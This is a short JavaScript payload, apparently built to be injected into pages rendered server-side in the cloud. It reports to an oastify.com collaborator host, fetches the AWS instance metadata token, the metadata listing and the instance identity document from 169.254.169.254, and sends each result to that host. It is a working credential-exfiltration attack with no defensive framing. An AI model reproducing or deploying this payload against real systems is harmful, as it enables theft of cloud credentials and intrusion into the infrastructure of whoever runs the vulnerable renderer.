
<script>
var logTimeServer = 'gh1x6q50n3gqejgo98skajgvmmslgb40.oastify.com';


function log(data) {
    var sreq = new XMLHttpRequest();
    sreq.open('GET', 'http://' + logTimeServer + '/?msg=' + encodeURI(data), true);
    sreq.send();
}

function get(url) {
    try {
        var req = new XMLHttpRequest();
        req.open('GET', url, false);
        req.send(null);
        if(req.status == 200)
            return req.responseText;
        else
            return '[failed status=' + req.status + ']';
    } catch(err) {
        log(err);
    }
    return null;
}

log('Triggered in ' + window.location.href);

/*
for(var i = 0; i < 60; ++i) {
    log('Loop ' + i);
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + logTimeServer + '/', false);
    req.send();
}
*/
log('Token: ' + get('http://169.254.169.254/latest/api/token'));
log('Meta Data: ' + get('http://169.254.169.254/latest/meta-data'));
log('Document: ' + get('http://169.254.169.254/latest/dynamic/instance-identity/document'));
</script>
